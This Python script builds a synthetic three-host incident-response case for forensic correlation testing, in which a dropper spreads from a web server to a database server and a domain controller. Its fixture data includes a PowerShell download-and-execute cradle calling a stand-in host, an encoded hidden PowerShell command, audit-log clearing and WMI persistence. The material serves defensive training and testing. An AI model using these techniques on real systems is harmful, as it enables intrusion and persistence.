"""Build a synthetic THREE-host case that tells one coherent pivot story.

This is the multi-host counterpart of make_sample_collection.py. It emits three
complete, custody-valid collection packages under examples/sample-case/ —

    web-01  entry host: a malicious download is executed, beacons to C2, and a
            service account (svc_backup) is created.
    db-02   lateral move FROM web-01: an interactive/network logon (4624, type 3)
            whose Source Network Address is web-01, reusing svc_backup; the same
            dropper (identical SHA-1) lands and beacons to the same C2.
    dc-01   pivot FROM db-02: another svc_backup logon sourced at db-02, the same
            dropper, the same C2, plus WMI-subscription persistence.

Three threads stitch the hosts together for cross-host correlation:
  * shared C2  203.0.113.45         (RFC 5737 documentation range)
  * reused account  svc_backup
  * identical dropper SHA-1  A94A8FE5CCB19BA61C4C0873D391E987982FBBD3

Every address/host is RFC 5737 / RFC 2606 reserved-for-documentation. The
committed packages are byte-exact and hash-correct (see manifest.json each).

Run:  python examples/make_sample_case.py
"""

import hashlib
import json
from pathlib import Path

OUT = Path(__file__).resolve().parent / "sample-case"

C2 = "203.0.113.45"          # RFC 5737 TEST-NET-3
ACCOUNT = "svc_backup"       # reused across the pivot chain
DROPPER_SHA1 = "A94A8FE5CCB19BA61C4C0873D391E987982FBBD3"  # identical on all hosts
DROPPER = "C:\\Users\\Public\\svchost.exe"

# host -> internal IP (each host's own address; a remote logon's src_ip points here)
HOST_IP = {"WEB-01": "192.0.2.11", "DB-02": "192.0.2.12", "DC-01": "192.0.2.13"}


def _e(ts, eid, host, detail, **kw):
    base = {"ts": ts, "event_id": eid, "channel": "Security", "computer": host,
            "user": "", "process": "", "parent_process": "", "cmdline": "",
            "dst_ip": "", "detail": detail,
            "logon_type": "", "src_ip": "", "src_host": ""}
    base.update(kw)
    return base


def _logon(ts, host, src_host, account, logon_type="3"):
    """A 4624 successful logon arriving FROM another host (the lateral move)."""
    return _e(ts, 4624, host,
              f"An account was successfully logged on: {account} "
              f"(type {logon_type}) from {src_host}",
              user=account, logon_type=logon_type,
              src_ip=HOST_IP[src_host], src_host=src_host)


# --------------------------------------------------------------------------
# web-01 — the entry host (delivery + execution, like the WEB-03 sample)
# --------------------------------------------------------------------------
def web01():
    host = "WEB-01"
    events = [
        _e("2026-05-02T09:12:00Z", 4688, host, "encoded PowerShell",
           process="powershell.exe", cmdline="powershell -nop -w hidden -enc SQBFAFgA"),
        _e("2026-05-02T09:12:05Z", 4104, host,
           "ScriptBlock: IEX (New-Object Net.WebClient).DownloadString('http://cdn.example-update.test/a')",
           channel="Microsoft-Windows-PowerShell/Operational"),
        _e("2026-05-02T09:13:00Z", 7045, host, "A new service was installed: FakeSvc"),
        _e("2026-05-02T09:16:00Z", 4720, host, f"A user account was created: {ACCOUNT}", user=ACCOUNT),
        _e("2026-05-02T09:18:00Z", 4698, host,
           "Scheduled task created: \\Updater -> C:\\Users\\Public\\svchost.exe"),
        _e("2026-05-02T09:40:00Z", 1102, host, "The audit log was cleared"),
    ]
    processes = [
        {"pid": 700, "ppid": 660, "name": "explorer.exe", "path": "C:\\Windows\\explorer.exe",
         "cmdline": "explorer.exe", "user": f"{host}\\jdoe", "created": "2026-05-02T08:00:00Z", "hash": ""},
        {"pid": 2104, "ppid": 700, "name": "powershell.exe",
         "path": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "cmdline": "powershell -nop -w hidden -enc SQBFAFgA", "user": f"{host}\\jdoe",
         "created": "2026-05-02T09:12:00Z", "hash": ""},
        {"pid": 3320, "ppid": 2104, "name": "svchost.exe", "path": DROPPER,
         "cmdline": DROPPER, "user": f"{host}\\jdoe", "created": "2026-05-02T09:12:30Z", "hash": ""},
    ]
    network = [
        {"proto": "tcp", "local": f"{HOST_IP[host]}:50112", "remote": f"{C2}:443",
         "state": "Established", "pid": 3320, "process": "svchost.exe"},
    ]
    users = [
        {"name": "jdoe", "enabled": True, "last_logon": "2026-05-02T08:00:00Z", "groups": ""},
        {"name": ACCOUNT, "enabled": True, "last_logon": "", "groups": "Administrators"},
    ]
    services = [
        {"name": "FakeSvc", "display": "Windows Update Helper", "path": "C:\\Windows\\Temp\\f.exe",
         "start": "Auto", "state": "Running", "account": "LocalSystem"},
    ]
    programs = [
        {"name": "svchost.exe", "path": DROPPER, "sha1": DROPPER_SHA1, "first_run": "2026-05-02T09:12:30Z"},
    ]
    registry = [
        {"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         "value_name": "Updater", "value_data": DROPPER, "last_write": "", "category": "run"},
    ]
    browser = [
        {"type": "download", "url": "http://cdn.example-update.test/svchost.exe", "title": "svchost.exe",
         "timestamp": "2026-05-02T09:10:00Z", "target_path": "C:\\Users\\jdoe\\Downloads\\svchost.exe",
         "browser": "Chrome"},
    ]
    filesystem = [
        {"path": "C:\\Users\\jdoe\\Downloads\\svchost.exe", "name": "svchost.exe",
         "created": "2026-05-02T09:10:05Z", "modified": "2026-05-02T09:10:05Z",
         "mft_modified": "2026-05-02T09:10:05Z", "size": 73216, "is_directory": False},
        {"path": DROPPER, "name": "svchost.exe",
         "created": "2026-05-02T09:11:50Z", "modified": "2026-05-02T09:11:50Z",
         "mft_modified": "2026-05-02T09:11:50Z", "size": 73216, "is_directory": False},
    ]
    prefetch = [
        {"name": "svchost.exe", "path": DROPPER, "run_count": 3,
         "last_run": "2026-05-02T09:30:00Z", "first_run": "2026-05-02T09:12:30Z",
         "prefetch_file": "SVCHOST.EXE-1A2B3C4D.pf"},
    ]
    shimcache = [
        {"position": 1, "name": "svchost.exe", "path": DROPPER,
         "last_modified": "2026-05-02T09:11:50Z", "executed": True, "sha1": DROPPER_SHA1},
    ]
    return host, {
        "events.json": events, "registry.json": registry, "processes.json": processes,
        "network.json": network, "users.json": users, "services.json": services,
        "programs.json": programs, "browser.json": browser, "filesystem.json": filesystem,
        "prefetch.json": prefetch, "shimcache.json": shimcache,
    }


# --------------------------------------------------------------------------
# db-02 — lateral move FROM web-01
# --------------------------------------------------------------------------
def db02():
    host = "DB-02"
    events = [
        _logon("2026-05-02T09:30:00Z", host, "WEB-01", ACCOUNT, logon_type="3"),
        _e("2026-05-02T09:31:00Z", 4688, host, "dropper executed", process="svchost.exe",
           cmdline=DROPPER),
        _e("2026-05-02T09:33:00Z", 7045, host, "A new service was installed: FakeSvc"),
    ]
    processes = [
        {"pid": 5210, "ppid": 1, "name": "svchost.exe", "path": DROPPER,
         "cmdline": DROPPER, "user": f"{host}\\{ACCOUNT}", "created": "2026-05-02T09:31:00Z", "hash": ""},
    ]
    network = [
        {"proto": "tcp", "local": f"{HOST_IP[host]}:51020", "remote": f"{C2}:443",
         "state": "Established", "pid": 5210, "process": "svchost.exe"},
    ]
    users = [
        {"name": "dbadmin", "enabled": True, "last_logon": "2026-05-02T07:00:00Z", "groups": ""},
        {"name": ACCOUNT, "enabled": True, "last_logon": "2026-05-02T09:30:00Z", "groups": "Administrators"},
    ]
    programs = [
        {"name": "svchost.exe", "path": DROPPER, "sha1": DROPPER_SHA1, "first_run": "2026-05-02T09:31:00Z"},
    ]
    registry = [
        {"hive": "HKLM", "key": "SYSTEM\\CurrentControlSet\\Services\\FakeSvc",
         "value_name": "ImagePath", "value_data": DROPPER, "last_write": "", "category": "service"},
    ]
    prefetch = [
        {"name": "svchost.exe", "path": DROPPER, "run_count": 1,
         "last_run": "2026-05-02T09:31:00Z", "first_run": "2026-05-02T09:31:00Z",
         "prefetch_file": "SVCHOST.EXE-2B3C4D5E.pf"},
    ]
    shimcache = [
        {"position": 1, "name": "svchost.exe", "path": DROPPER,
         "last_modified": "2026-05-02T09:30:40Z", "executed": True, "sha1": DROPPER_SHA1},
    ]
    return host, {
        "events.json": events, "registry.json": registry, "processes.json": processes,
        "network.json": network, "users.json": users, "programs.json": programs,
        "prefetch.json": prefetch, "shimcache.json": shimcache,
    }


# --------------------------------------------------------------------------
# dc-01 — pivot FROM db-02, plus WMI persistence
# --------------------------------------------------------------------------
def dc01():
    host = "DC-01"
    events = [
        _logon("2026-05-02T09:50:00Z", host, "DB-02", ACCOUNT, logon_type="3"),
        _e("2026-05-02T09:51:00Z", 4688, host, "dropper executed", process="svchost.exe",
           cmdline=DROPPER),
        _e("2026-05-02T09:55:00Z", 4720, host, f"A user account was created: {ACCOUNT}2", user=f"{ACCOUNT}2"),
    ]
    processes = [
        {"pid": 6120, "ppid": 1, "name": "svchost.exe", "path": DROPPER,
         "cmdline": DROPPER, "user": f"{host}\\{ACCOUNT}", "created": "2026-05-02T09:51:00Z", "hash": ""},
    ]
    network = [
        {"proto": "tcp", "local": f"{HOST_IP[host]}:52044", "remote": f"{C2}:443",
         "state": "Established", "pid": 6120, "process": "svchost.exe"},
    ]
    users = [
        {"name": "Administrator", "enabled": True, "last_logon": "2026-05-02T06:00:00Z", "groups": "Administrators"},
        {"name": ACCOUNT, "enabled": True, "last_logon": "2026-05-02T09:50:00Z", "groups": "Administrators"},
    ]
    services = [
        {"name": "FakeSvc", "display": "Windows Update Helper", "path": DROPPER,
         "start": "Auto", "state": "Running", "account": "LocalSystem"},
    ]
    programs = [
        {"name": "svchost.exe", "path": DROPPER, "sha1": DROPPER_SHA1, "first_run": "2026-05-02T09:51:00Z"},
    ]
    registry = [
        {"hive": "HKLM", "key": "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
         "value_name": "Updater", "value_data": DROPPER, "last_write": "", "category": "run"},
    ]
    prefetch = [
        {"name": "svchost.exe", "path": DROPPER, "run_count": 2,
         "last_run": "2026-05-02T10:00:00Z", "first_run": "2026-05-02T09:51:00Z",
         "prefetch_file": "SVCHOST.EXE-3C4D5E6F.pf"},
    ]
    shimcache = [
        {"position": 1, "name": "svchost.exe", "path": DROPPER,
         "last_modified": "2026-05-02T09:50:40Z", "executed": True, "sha1": DROPPER_SHA1},
    ]
    wmi = [
        {"filter_name": "WinUpdateFilter", "consumer_name": "WinUpdateConsumer",
         "consumer_type": "CommandLineEventConsumer",
         "query": "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE "
                  "TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'",
         "command": DROPPER},
    ]
    return host, {
        "events.json": events, "registry.json": registry, "processes.json": processes,
        "network.json": network, "users.json": users, "services.json": services,
        "programs.json": programs, "prefetch.json": prefetch, "shimcache.json": shimcache,
        "wmi.json": wmi,
    }


def write_package(host: str, files: dict, dirname: str) -> None:
    pkg = OUT / dirname
    pkg.mkdir(parents=True, exist_ok=True)
    entries = []
    for name, data in files.items():
        path = pkg / name
        path.write_text(json.dumps(data, indent=2))
        sha = hashlib.sha256(path.read_bytes()).hexdigest().upper()
        entries.append({"name": name, "sha256": sha, "count": len(data)})
    manifest = {
        "case_id": "IR-2026-045", "operator": "T.Nelson", "collector_version": "2.0.0",
        "profile": "quick",
        "host": {"computer": host, "os": "Windows Server 2022",
                 "boot_time": "2026-05-01T22:00:00Z", "current_user": f"{host}\\svc_backup",
                 "collected_at": "2026-05-02T10:30:00Z"},
        "collected_at": "2026-05-02T10:30:00Z", "files": entries,
    }
    (pkg / "manifest.json").write_text(json.dumps(manifest, indent=2))


def main():
    for builder, dirname in ((web01, "web-01"), (db02, "db-02"), (dc01, "dc-01")):
        host, files = builder()
        write_package(host, files, dirname)
        print(f"wrote {dirname} ({host}) — {len(files)} artifact files")
    print(f"sample case -> {OUT}")


if __name__ == "__main__":
    main()
